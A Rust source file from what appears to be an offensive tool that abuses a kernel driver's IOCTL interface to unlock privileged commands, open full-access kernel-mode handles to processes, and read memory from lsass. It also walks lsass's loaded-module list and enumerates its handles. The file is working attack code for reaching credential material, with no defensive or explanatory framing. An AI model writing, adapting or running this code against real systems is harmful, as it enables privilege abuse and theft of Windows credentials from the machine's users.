use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, Ordering};

use axhunter_lsa::MemReader;
use crate::proto::{
    Handle, WBCC_LEN, ARG_OFF,
    CMD_REGISTER, CMD_FLAG_30, CMD_SET_FLAGS, CMD_OPEN_PROC,
    CMD_READ_MEM, CMD_QUERY_PROC,
    PROC_ALL_ACCESS, PROCESS_HANDLE_INFORMATION, HANDLE_ENTRY_SIZE,
    make_wbcc, send_cmd,
};

type NTSTATUS = i32;

#[link(name = "ntdll")]
unsafe extern "system" {
    fn NtQuerySystemInformation(
        SystemInformationClass: u32,
        SystemInformation: *mut c_void,
        SystemInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> NTSTATUS;
}

// ── Session ───────────────────────────────────────────────────────────────────

pub struct Xh2Session {
    pub dev:         Handle,
    pub wbcc:        [u8; WBCC_LEN],
    pub proc_handle: u64,
    pub debug:       AtomicBool,
}

impl MemReader for Xh2Session {
    fn read(&self, addr: u64, buf: &mut [u8]) -> bool {
        if buf.is_empty() || addr == 0 { return false; }
        let mut offset = 0usize;
        while offset < buf.len() {
            let chunk  = (buf.len() - offset).min(0x1000);
            let src_va = addr + offset as u64;
            let dst_va = buf.as_mut_ptr() as u64 + offset as u64;
            let (st, raw) = send_cmd(self.dev, CMD_READ_MEM, &self.wbcc, |req| {
                req[ARG_OFF..ARG_OFF+8].copy_from_slice(&self.proc_handle.to_le_bytes());
                req[ARG_OFF+8..ARG_OFF+16].copy_from_slice(&src_va.to_le_bytes());
                req[ARG_OFF+16..ARG_OFF+24].copy_from_slice(&dst_va.to_le_bytes());
                req[ARG_OFF+24..ARG_OFF+28].copy_from_slice(&(chunk as u32).to_le_bytes());
            });
            let bytes_read = raw as u32;
            if self.debug.fetch_and(false, Ordering::Relaxed) {
                println!("[+] cmd787  handle={:#x}  src={src_va:#018x}  size={chunk:#x}  read={bytes_read}  NTSTATUS {:#010x}",
                    self.proc_handle, st as u32);
            }
            if st != 0 || bytes_read == 0 { return false; }
            offset += bytes_read as usize;
        }
        true
    }
}

// ── Auth escalation ───────────────────────────────────────────────────────────

pub unsafe fn escalate(dev: Handle, wbcc: &[u8; WBCC_LEN], our_pid: u32) -> bool {
    let (st777, _) = send_cmd(dev, CMD_REGISTER, wbcc, |_| {});
    println!("[+] cmd 777  register pid={our_pid:#x}  NTSTATUS {:#010x}", st777 as u32);

    let user_buf = [0u8; 64];
    let (st779, _) = send_cmd(dev, CMD_FLAG_30, wbcc, |req| {
        let ptr = user_buf.as_ptr() as u64;
        req[ARG_OFF..ARG_OFF+8].copy_from_slice(&ptr.to_le_bytes());
        req[ARG_OFF+8..ARG_OFF+12].copy_from_slice(&64u32.to_le_bytes());
    });
    println!("[+] cmd 779  set bit30  NTSTATUS {:#010x}", st779 as u32);

    let (st775, _) = send_cmd(dev, CMD_SET_FLAGS, wbcc, |req| {
        req[ARG_OFF..ARG_OFF+4].copy_from_slice(&our_pid.to_le_bytes());
        req[ARG_OFF+4..ARG_OFF+8].copy_from_slice(&8u32.to_le_bytes());
    });
    println!("[+] cmd 775  gate open  NTSTATUS {:#010x}", st775 as u32);

    st775 == 0
}

pub fn open_proc(dev: Handle, wbcc: &[u8; WBCC_LEN], pid: u32) -> Result<u64, i32> {
    let (st, handle) = send_cmd(dev, CMD_OPEN_PROC, wbcc, |req| {
        req[ARG_OFF..ARG_OFF+4].copy_from_slice(&pid.to_le_bytes());
        req[ARG_OFF+4..ARG_OFF+8].copy_from_slice(&PROC_ALL_ACCESS.to_le_bytes());
    });
    println!("[+] cmd 785  KernelMode handle  pid={pid}  handle={handle:#x}  NTSTATUS {:#010x}", st as u32);
    if st != 0 || handle == 0 { Err(st) } else { Ok(handle) }
}

pub fn new_session(dev: Handle, pe_base: u64, proc_handle: u64) -> Xh2Session {
    Xh2Session {
        dev,
        wbcc: make_wbcc(pe_base),
        proc_handle,
        debug: AtomicBool::new(true),
    }
}

// ── PID lookup ────────────────────────────────────────────────────────────────

pub fn find_pid(name: &str) -> Result<u32, String> {
    let needle = name.to_ascii_lowercase();
    let mut buf: Vec<u8> = vec![0u8; 0x80000];
    loop {
        let mut ret_len: u32 = 0;
        let st = unsafe {
            NtQuerySystemInformation(5, buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32, &mut ret_len)
        };
        if st == -1073741820i32 {
            buf.resize((ret_len as usize).saturating_add(0x10000).max(buf.len() * 2), 0);
            continue;
        }
        if st < 0 { return Err(format!("NtQuerySystemInformation NTSTATUS {st:#010x}")); }
        break;
    }
    let mut offset: usize = 0;
    loop {
        if offset + 88 > buf.len() { break; }
        let next    = u32::from_le_bytes(buf[offset..offset+4].try_into().unwrap()) as usize;
        let pid     = usize::from_le_bytes(buf[offset+80..offset+88].try_into().unwrap()) as u32;
        let img_len = u16::from_le_bytes(buf[offset+56..offset+58].try_into().unwrap()) as usize;
        let img_ptr = u64::from_le_bytes(buf[offset+64..offset+72].try_into().unwrap());
        if img_ptr != 0 && img_len > 0 {
            let buf_base = buf.as_ptr() as u64;
            if img_ptr >= buf_base && img_ptr + img_len as u64 <= buf_base + buf.len() as u64 {
                let str_off = (img_ptr - buf_base) as usize;
                let wchars: Vec<u16> = buf[str_off..str_off+img_len]
                    .chunks_exact(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect();
                let exe = String::from_utf16_lossy(&wchars).to_ascii_lowercase();
                if exe == needle { return Ok(pid); }
            }
        }
        if next == 0 { break; }
        offset += next;
    }
    Err(format!("process '{name}' not found"))
}

// ── PEB / LDR module lookup ───────────────────────────────────────────────────

pub fn peb_address(proc_handle: Handle) -> Result<u64, String> {
    use windows::core::s;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    type NtQipFn = unsafe extern "system" fn(Handle, u32, *mut c_void, u32, *mut u32) -> i32;
    unsafe {
        let ntdll = GetModuleHandleA(s!("ntdll.dll"))
            .map_err(|e| format!("GetModuleHandleA(ntdll): {e}"))?;
        let proc = GetProcAddress(ntdll, s!("NtQueryInformationProcess"))
            .ok_or("NtQueryInformationProcess not found")?;
        let f: NtQipFn = std::mem::transmute(proc);
        let mut pbi = [0u8; 48];
        let mut ret_len = 0u32;
        let st = f(proc_handle, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
        if st < 0 { return Err(format!("NtQueryInformationProcess: {st:#010x}")); }
        Ok(u64::from_le_bytes(pbi[8..16].try_into().unwrap()))
    }
}

pub fn find_remote_module(session: &Xh2Session, proc_handle: Handle, name: &str) -> Result<u64, String> {
    let peb_va    = peb_address(proc_handle)?;
    let ldr       = session.read_u64(peb_va + 0x18);
    if ldr == 0 { return Err("PEB.Ldr is NULL".into()); }
    let list_head = ldr + 0x20;
    let target    = name.to_ascii_lowercase();
    let mut flink = session.read_u64(list_head);
    for _ in 0..256 {
        if flink == 0 || flink == list_head { break; }
        let dll_base = session.read_u64(flink + 0x20);
        let mod_name = session.read_unicode_string(flink + 0x48);
        if mod_name.to_ascii_lowercase() == target { return Ok(dll_base); }
        let next = session.read_u64(flink);
        if next == flink { break; }
        flink = next;
    }
    Err(format!("module '{name}' not found in lsass"))
}

// ── Handle enumeration ────────────────────────────────────────────────────────

pub fn enum_handles(dev: Handle, wbcc: &[u8; WBCC_LEN], proc_handle: u64) -> Result<Vec<u64>, String> {
    let mut buf_size: usize = 0x1_0000;
    let mut out_buf: Vec<u8>;
    loop {
        out_buf = vec![0u8; buf_size];
        let (st, ret_len) = send_cmd(dev, CMD_QUERY_PROC, wbcc, |req| {
            req[ARG_OFF..ARG_OFF+8].copy_from_slice(&proc_handle.to_le_bytes());
            req[ARG_OFF+8..ARG_OFF+12].copy_from_slice(&PROCESS_HANDLE_INFORMATION.to_le_bytes());
            req[ARG_OFF+12..ARG_OFF+20].copy_from_slice(&(out_buf.as_mut_ptr() as u64).to_le_bytes());
            req[ARG_OFF+20..ARG_OFF+24].copy_from_slice(&(buf_size as u32).to_le_bytes());
        });
        if st == -1073741820i32 {
            buf_size = (ret_len as u32 as usize).saturating_add(0x1000).max(buf_size * 2);
            continue;
        }
        if st != 0 { return Err(format!("{st:#010x}")); }
        break;
    }
    if out_buf.len() < 16 { return Err("cmd 791 buffer too small".into()); }
    let count = u64::from_le_bytes(out_buf[..8].try_into().unwrap()) as usize;
    let mut handles = Vec::with_capacity(count);
    for i in 0..count {
        let off = 16 + i * HANDLE_ENTRY_SIZE;
        if off + HANDLE_ENTRY_SIZE > out_buf.len() { break; }
        handles.push(u64::from_le_bytes(out_buf[off..off+8].try_into().unwrap()));
    }
    Ok(handles)
}
